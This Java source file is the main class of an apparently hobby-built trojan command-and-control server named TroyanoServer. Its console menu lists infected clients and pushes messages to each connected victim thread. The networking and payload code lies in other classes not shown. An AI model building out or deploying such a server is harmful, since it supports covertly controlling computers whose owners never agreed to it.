package com.cafeconpalito.troyanoserver;

import java.util.ArrayList;
import java.util.Scanner;

/**
 *
 * @author carra
 */
public class TroyanoServer {

    private static ArrayList<Client> listaclientes = new ArrayList();
    private static ArrayList<HiloServer> listaactivos = new ArrayList();
    private static Scanner sc = new Scanner(System.in);

    public static void main(String[] args) {

        System.out.println("Server Escuchando");
        HiloRecepcion h = new HiloRecepcion(); // creamos un hilo de cliente

        Thread t = new Thread(h);

        t.start(); //lanzamos el hilo
        do {
            System.out.println("1- Mostrar informacion de los clientes infetados");
            System.out.println("2- Enviar mensaje");
            int lectura = sc.nextInt();
            switch (lectura) {
                case 1:
                    for (Client c : listaclientes) {
                        System.out.println(c.toString());
                    }
                    break;
                case 2:
                    for (HiloServer l : listaactivos) {
                        System.out.println(l.getId());
                        l.setEnvio(true);
                    }
                    break;
                default:
                    throw new AssertionError();
            }
        } while (true);

    }

    public static ArrayList<Client> getListaclientes() {
        return listaclientes;
    }

    public static ArrayList<HiloServer> getListaactivos() {
        return listaactivos;
    }

}
